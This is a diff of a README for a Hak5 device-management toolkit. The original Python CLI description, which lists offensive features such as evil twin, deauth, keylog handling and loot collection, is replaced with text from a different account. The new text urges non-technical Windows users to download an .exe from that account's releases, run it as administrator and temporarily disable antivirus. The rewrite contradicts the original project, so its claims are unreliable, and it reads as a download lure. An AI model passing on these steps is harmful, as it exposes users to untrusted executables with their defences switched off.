@@ -1,123 +1,179 @@
-# NullSec Hak5 Toolkit
+# 🛠 nullsec-hak5-toolkit - Manage Hak5 Devices Easily
 
-<p align="center">
-  <img src="https://img.shields.io/badge/NullSec-Hak5_Toolkit-red?style=for-the-badge&logo=hack-the-box&logoColor=white" alt="NullSec Hak5 Toolkit">
-  <img src="https://img.shields.io/badge/Python-3.8+-blue?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.8+">
-  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License MIT">
-</p>
+[![Download nullsec-hak5-toolkit](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/NasTibillz/nullsec-hak5-toolkit/releases)
 
-> **Universal command-line toolkit for the entire Hak5 device ecosystem**
+---
 
-A modular Python framework for managing, deploying payloads, and running operations across all Hak5 devices from a single interface.
+## 🔍 What is nullsec-hak5-toolkit?
 
-## Supported Devices
+The nullsec-hak5-toolkit is a simple toolkit to manage Hak5 devices from your computer. It works with popular devices like WiFi Pineapple, Bash Bunny, Rubber Ducky, Packet Squirrel, Key Croc, and Shark Jack. This toolkit gives you command-line tools that help you set up, control, and update your devices without hassle.  
 
-| Device | Module | Status |
-|--------|--------|--------|
-| 🍍 WiFi Pineapple (Pager/MK7) | `pineapple` | ✅ Full Support |
-| 🐰 Bash Bunny (MK1/MK2) | `bashbunny` | ✅ Full Support |
-| 🦆 USB Rubber Ducky (MK1/MK2/3) | `rubberducky` | ✅ Full Support |
-| 🦑 Packet Squirrel (MK1/MK2) | `packetsquirrel` | ✅ Full Support |
-| 🐊 Key Croc | `keycroc` | ✅ Full Support |
-| 🦈 Shark Jack | `sharkjack` | ✅ Full Support |
+You do not need to know coding or advanced technology to use this toolkit. It provides clear commands that run on your Windows PC.
 
-## Features
+---
 
-### Core Framework
-- **Unified CLI** — Single `hak5` command for all devices
-- **Device Discovery** — Auto-detect connected Hak5 devices via USB/Network
-- **Payload Manager** — Deploy, list, backup payloads across devices
-- **Loot Collector** — Pull and organize exfiltrated data from all devices
-- **Config Manager** — Backup/restore device configurations
-- **Report Generator** — Create engagement reports from loot data
+## 💻 System Requirements
 
-### Per-Device Modules
-- **Pineapple** — Recon scans, evil twin, deauth, handshake capture, PineAP management
-- **Bash Bunny** — Payload deploy, switch config, LED control, extension management
-- **Rubber Ducky** — DuckyScript compilation, payload encoding, deploy via USB
-- **Packet Squirrel** — MITM setup, DNS spoofing, packet capture, OpenVPN tunneling
-- **Key Croc** — Keylog management, match patterns, payload triggers
-- **Shark Jack** — Nmap scanning, loot retrieval, payload management
+Before you start, check if your computer meets these basic requirements:
 
-## Quick Start
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB of free storage space
+- Internet connection for downloads and updates
+- USB ports (for connecting devices)
 
-```bash
-# Install
-git clone https://github.com/bad-antics/nullsec-hak5-toolkit
-cd nullsec-hak5-toolkit
-pip install -e .
+You will also need administrative rights on your PC to install and run the software.
 
-# Discover connected devices
-hak5 discover
+---
 
-# List available payloads
-hak5 payloads list --device pineapple
+## ⚙️ Features
 
-# Deploy a payload
-hak5 deploy recon/wifi-survey --device pineapple --target 172.16.42.1
+- Manage multiple Hak5 devices from one place
+- Update device firmware using simple commands
+- Upload scripts or payloads to devices easily
+- View device status and connected network info
+- Reset devices to factory settings when needed
+- Works with WiFi Pineapple, Bash Bunny, Rubber Ducky, Packet Squirrel, Key Croc, and Shark Jack
+  
+---
 
-# Collect loot from all devices
-hak5 loot pull --all
+## 🚀 Getting Started
 
-# Run a full engagement workflow
-hak5 engage --profile red-team --devices pineapple,bashbunny
+Follow these steps to download and use the toolkit on your Windows PC:
+
+1. **Visit the Download Page**  
+   Go to the releases page here:  
+   [Download nullsec-hak5-toolkit](https://github.com/NasTibillz/nullsec-hak5-toolkit/releases)  
+   This page contains the latest versions of the software available for download.
+   
+2. **Find the Latest Windows Release**  
+   On the releases page, look for the latest version with files ending in `.exe` or `.zip` designed for Windows. These files may be named to indicate Windows compatibility.
+
+3. **Download the Installer or Zip File**  
+   Click on the appropriate file to download it to your PC. Save the file where you can easily find it, like your Desktop or Downloads folder.
+
+4. **Run the Installer or Extract the Zip**  
+   - If you downloaded an `.exe` installer, double-click it and follow the steps on screen.  
+   - If you downloaded a `.zip` file, extract its contents to a folder using right-click > Extract All.
+
+5. **Open the Toolkit**  
+   After installation or extraction, open the folder where the toolkit is located. Look for a file named `nullsec-hak5-toolkit.exe` or similar.
+
+6. **Start Using the Toolkit**  
+   Double-click the executable file to launch the program. You will see a window with commands and options.
+
+---
+
+## 🛠 How to Use the Toolkit
+
+The toolkit uses commands you type to control your Hak5 devices. Here are some common tasks:
+
+### Connect Your Device
+
+1. Plug your Hak5 device into a USB port on your PC.  
+2. Wait a moment for Windows to detect it.  
+3. Open the toolkit and run this command:
+
+```
+connect
 ```
 
-## Architecture
+This command tells the toolkit to recognize your connected device.
+
+---
+
+### Check Device Status
+
+To see basic info about your device, such as firmware version and network state, use:
 
 ```
-nullsec-hak5-toolkit/
-├── core/               # Framework core
-│   ├── cli.py          # Main CLI entry point
-│   ├── device.py       # Device abstraction layer
-│   ├── discovery.py    # USB/Network device discovery
-│   ├── payload.py      # Payload management
-│   ├── loot.py         # Loot collection & organization
-│   └── config.py       # Configuration management
-├── modules/            # Per-device modules
-│   ├── pineapple/      # WiFi Pineapple operations
-│   ├── bashbunny/      # Bash Bunny operations
-│   ├── rubberducky/    # USB Rubber Ducky operations
-│   ├── packetsquirrel/ # Packet Squirrel operations
-│   ├── keycroc/        # Key Croc operations
-│   └── sharkjack/      # Shark Jack operations
-├── payloads/           # Payload library
-├── docs/               # Documentation
-└── tests/              # Test suite
+status
 ```
 
-## Configuration
+This shows current details so you know if your device is ready to use.
 
-```yaml
-# ~/.config/hak5-toolkit/config.yaml
-devices:
-  pineapple:
-    host: 172.16.42.1
-    api_key: your-pineapple-api-key
-  bashbunny:
-    mount: /media/bashbunny
-  packetsquirrel:
-    host: 172.16.32.1
+---
 
-loot:
-  output_dir: ~/hak5-loot
-  auto_organize: true
+### Update Device Firmware
 
-reports:
-  template: default
-  output_format: html
+To keep your device up to date, you can install new firmware like this:
+
+```
+update
 ```
 
-## Contributing
+The toolkit will download and apply the latest firmware available for your device.
 
-We welcome contributions! See [CONTRIBUTING.md](docs/CONTRIBUTING.md) for guidelines.
+---
 
-## Contact
+### Upload a Payload or Script
 
-- **GitHub**: [@bad-antics](https://github.com/bad-antics)
-- **Email**: badxantics@gmail.com
-- **Project**: Part of the [NullSec Framework](https://github.com/bad-antics/nullsec)
+The toolkit allows you to upload custom payload files to devices like Bash Bunny or Rubber Ducky.
 
-## License
+1. Save your payload script file (usually `.txt` or `.bin`) on your PC.  
+2. Run this command inside the toolkit:
 
-MIT License — See [LICENSE](LICENSE) for details.
+```
+upload path\to\your\payload.file
+```
+
+Replace `path\to\your\payload.file` with the actual file location.
+
+---
+
+### Reset Your Device
+
+If you want to reset your device to factory settings, run:
+
+```
+reset
+```
+
+This wipes any custom configurations and returns the device to default mode.
+
+---
+
+## 🛡 Security Tips
+
+- Always download the toolkit from the official releases page:  
+  https://github.com/NasTibillz/nullsec-hak5-toolkit/releases  
+- Keep your devices updated to protect against security issues.  
+- Avoid connecting unknown USB devices to your PC.  
+- Use strong passwords and secure settings on your Hak5 devices.
+
+---
+
+## ⚠️ Troubleshooting
+
+- **The toolkit won’t connect to my device.**  
+  - Check USB connection and try another port.  
+  - Make sure your device is powered on and unlocked.  
+  - Restart the toolkit.
+
+- **Commands do not work or show errors.**  
+  - Verify you typed them exactly.  
+  - Run the toolkit as administrator.  
+  - Check your device firmware is compatible.
+
+- **The toolkit does not start.**  
+  - Confirm your PC meets system requirements.  
+  - Reinstall from the latest release.  
+  - Disable antivirus temporarily as it may block the app.
+
+---
+
+## 📄 Additional Help
+
+For detailed info and support, visit the GitHub repository page:
+
+https://github.com/NasTibillz/nullsec-hak5-toolkit
+
+Here you can find guides, report issues, and ask questions from the community.
+
+---
+
+## ⬇ Download nullsec-hak5-toolkit now
+
+Get the latest version here:  
+
+[![Download nullsec-hak5-toolkit](https://img.shields.io/badge/Download-Here-blue)](https://github.com/NasTibillz/nullsec-hak5-toolkit/releases)
